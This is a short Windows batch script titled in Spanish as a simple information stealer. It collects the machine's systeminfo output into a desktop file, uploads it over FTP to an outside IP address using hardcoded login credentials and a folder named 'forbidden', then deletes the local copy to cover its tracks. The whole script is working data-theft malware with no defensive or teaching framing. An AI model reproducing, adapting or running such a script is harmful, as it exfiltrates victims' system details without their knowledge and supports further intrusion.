@echo off
title Simple_Roba_Informacion
cd %userprofile%\Desktop
systeminfo > info.exe
@echo on
@ftp -i -s:"%~f0"&GOTO:EOF
open 31.170.160.88
a2688484
Quepaso01
cd /public_html/forbidden/filesactive
lcd "C:\Users\Side Master\Desktop"
send info.exe
bye
@echo off
echo Finalizado correctamente.
pause>nul
del /s /q f info.exe
exit